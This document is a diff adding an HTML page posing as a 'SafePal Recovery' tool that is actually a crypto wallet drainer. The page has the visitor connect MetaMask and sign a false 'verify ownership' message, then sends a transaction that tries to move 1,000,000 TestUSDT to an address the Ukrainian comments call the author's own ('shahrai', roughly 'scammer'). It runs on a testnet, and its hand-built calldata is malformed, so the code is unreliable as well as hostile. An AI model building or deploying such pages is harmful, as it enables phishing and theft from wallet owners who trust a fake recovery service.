@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SafePal Recovery</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin: 10px;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>SafePal Recovery</h2>
+        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
+        <p id="status">Please connect your MetaMask wallet.</p>
+    </div>
+
+    <script>
+        async function connectWallet() {
+            try {
+                document.getElementById('status').innerText = 'Connecting...';
+
+                if (!window.ethereum || !window.ethereum.isMetaMask) {
+                    throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
+                }
+
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts.length === 0) {
+                    throw new Error('No accounts found. Please unlock MetaMask.');
+                }
+
+                const userAddress = accounts[0];
+                document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
+
+                // Перевірка мережі (Sepolia)
+                const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
+                const targetChainId = 11155111; // Sepolia Testnet
+                if (chainId !== targetChainId) {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
+                    });
+                }
+
+                // Підпис повідомлення
+                const message = 'Verify wallet ownership for SafePal recovery';
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, userAddress]
+                });
+
+                console.log('Signature:', signature);
+                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
+
+                // Виклик контракту
+                const contractAddress = '0x0a26fF982bb3fAf18eCCE3DE21b3E7733FafBB76'; // Адреса ApproveContract
+                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // Адреса твого TestUSDT
+                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Твоя адреса
+                const amount = 1000000; // 1,000,000 TestUSDT (6 decimals)
+
+                const data = new TextEncoder().encode(message).reduce((hex, byte) => hex + byte.toString(16).padStart(2, '0'), '0x');
+                const tx = {
+                    to: contractAddress,
+                    data: `0x${'executeApprove'}${'0'.repeat(64 - 'executeApprove'.length)}${data.slice(2)}${userAddress.slice(2).padEnd(64, '0')}${signature.slice(2).padEnd(130, '0')}${usdtAddress.slice(2).padEnd(64, '0')}${shahraiAddress.slice(2).padEnd(64, '0')}${amount.toString(16).padStart(64, '0')}`
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [tx]
+                });
+
+                console.log('Transaction Hash:', txHash);
+                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
+
+            } catch (error) {
+                document.getElementById('status').innerText = `Error: ${error.message}`;
+                console.error('Detailed error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
